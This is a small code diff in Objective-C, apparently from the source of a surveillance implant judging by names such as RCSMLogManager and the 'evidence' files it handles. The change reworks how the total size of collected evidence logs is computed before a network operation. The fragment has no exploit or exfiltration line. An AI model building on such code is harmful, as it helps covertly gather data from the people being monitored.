@@ -15,7 +15,6 @@
 #import "SizeNetworkOperation.h"
 
 #import "NSMutableData+AES128.h"
-//#import "FSNetworkOperation.h"
 #import "RCSMLogManager.h"
 #import "RCSMDiskQuota.h"
 
@@ -61,12 +60,15 @@
         for (NSDictionary *element in aArray)
         {
             NSString *logName = [[element objectForKey: @"logName"] copy];
-            if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
+            //if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
+            if(logName != nil)
             {
-                evidenceSize += [[[NSFileManager defaultManager] attributesOfItemAtPath:logName error:nil ]fileSize];
-#ifdef DEBUG_SIZE_NOP
-                infoLog(@"total evidence size: %i",evidenceSize);
-#endif
+                //evidenceSize += [[[NSFileManager defaultManager] attributesOfItemAtPath:logName error:nil ]fileSize];
+                NSDictionary *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:logName error:nil ];
+                if(attributes != nil)
+                {
+                    evidenceSize += [attributes fileSize];
+                }
             }
         }
     }
